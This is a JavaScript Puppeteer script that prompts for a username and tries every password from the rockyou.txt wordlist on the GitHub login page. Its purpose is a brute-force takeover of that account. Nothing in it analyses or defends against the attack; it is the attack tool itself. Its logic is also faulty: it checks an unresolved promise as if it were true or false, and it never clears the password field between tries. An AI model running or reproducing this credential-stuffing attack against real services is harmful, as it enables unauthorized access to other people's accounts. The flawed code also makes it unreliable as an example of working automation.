const puppeteer = require('puppeteer');
var readline = require('readline');


const fs = require('fs') 
  
fs.readFile('logo.txt', 'utf-8', (err, data) => { 
    if (err) throw err; 
    console.log(data); 
})


var rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

rl.question("What user would you like to brute force? ", function(answer) {
    
    console.log("Lets Get started On", answer);

async function scraperSite(url){

    const chromeOptions = {
        headless:false,
        defaultViewport: null,
        executablePath: 'C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe'
    };


    const browser = await puppeteer.launch(chromeOptions);
    const page = await browser.newPage();
    await page.goto(url);

    // Login Script
    
    await page.type('#login_field', answer);

    var file = fs.readFileSync('rockyou.txt','utf8');
    strtoarray = file.split('\n');
    newpass = strtoarray;
    console.log(newpass[0]);

    var i;
    for(i=0; i < 14344392; i++){
        await page.type('#password', newpass[i]);
        console.log("Testing The Password: " + newpass[i]);
        await page.click('[name="commit"]');
        if (page.waitForSelector('otp') == true){
            console.log("Wow that was easy, the password is: "+ newpass[i]);
            browser.close();
        }
        else{
            continue;
        }
    }
}

scraperSite('https://github.com/login');

rl.close();
})